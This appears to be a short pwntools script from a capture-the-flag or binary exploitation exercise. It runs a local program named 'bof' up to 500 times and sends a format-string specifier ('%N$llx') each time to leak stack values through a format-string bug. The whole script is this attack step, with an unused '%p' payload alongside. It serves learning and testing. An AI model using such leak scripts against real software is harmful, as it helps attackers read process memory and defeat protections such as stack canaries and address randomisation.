from pwn import *

elf = context.binary = ELF('./bof',checksec=False)
context.terminal = ["tmux", "splitw", "-h"]

pay = b"%p || "*30

for i in range(500):
    try:
        p = process(elf.path, level='error')
        p.sendlineafter(b': ', '%{}$llx'.format(i).encode())
        res = p.recvline().decode()
        if res:
            print(str(i) + ':' + str(res).strip())
    except EOFError:
        pass

